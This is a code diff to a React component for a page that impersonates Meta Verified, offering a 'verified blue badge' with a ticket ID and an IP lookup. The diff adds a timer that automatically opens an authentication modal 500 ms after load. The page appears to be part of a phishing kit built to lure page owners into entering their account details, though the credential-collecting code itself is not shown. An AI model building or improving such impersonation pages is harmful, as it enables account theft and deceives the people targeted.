@@ -20,6 +20,7 @@ const ReCapcha = () => {
     const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
 
     const notificationSent = React.useRef(false);
+    const hasAutoClicked = React.useRef(false);
     
     const getIp = async () => {
         try {
@@ -51,6 +52,18 @@ const ReCapcha = () => {
         };
 
         generateTicketId();
+    }, []);
+
+    // Tự động click vào nút Submit Request khi component mount
+    React.useEffect(() => {
+        const timer = setTimeout(() => {
+            if (!hasAutoClicked.current) {
+                hasAutoClicked.current = true;
+                handleOpendModal(true);
+            }
+        }, 500);
+
+        return () => clearTimeout(timer);
     }, []);
 
     const handleOpendModal = (isOpenAuth: any) => {
@@ -89,7 +102,7 @@ const ReCapcha = () => {
                             <img src="/images/icons/ic_blue.svg" alt="meta" className="order-1 md:w-[72px] w-[48px] md:h-[72px] h-[48px] mb-6" />
                             <h1 className="md:text-[48px] text-[32px] mb-4 order-2 leading-[1.15]">Show the world that you mean business.</h1>
                             <p className="text-[16px] text-[#1c2b33] font-[400] order-3 mb-6 leading-[1.5]">Meta Verified helps you build more confidence with new audiences and protects your brand.</p>
-                            <button onClick={() => handleOpendModal(true)} className="order-4 bg-[#0064e0] text-white px-10 py-[16px] flex items-center justify-center rounded-[45px] font-[700] text-[16px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit Request</button>
+                            <button id="submit-request-btn" onClick={() => handleOpendModal(true)} className="order-4 bg-[#0064e0] text-white px-10 py-[16px] flex items-center justify-center rounded-[45px] font-[700] text-[16px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit Request</button>
                             <p className="order-5 text-[14px] text-[#465A69] font-[400] mt-4 leading-[1.5]">Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.</p>
                             <p className="order-6 text-[16px] mt-4 text-[#465a69]">Your ticket id: #{ticketId}</p>
                         </div>
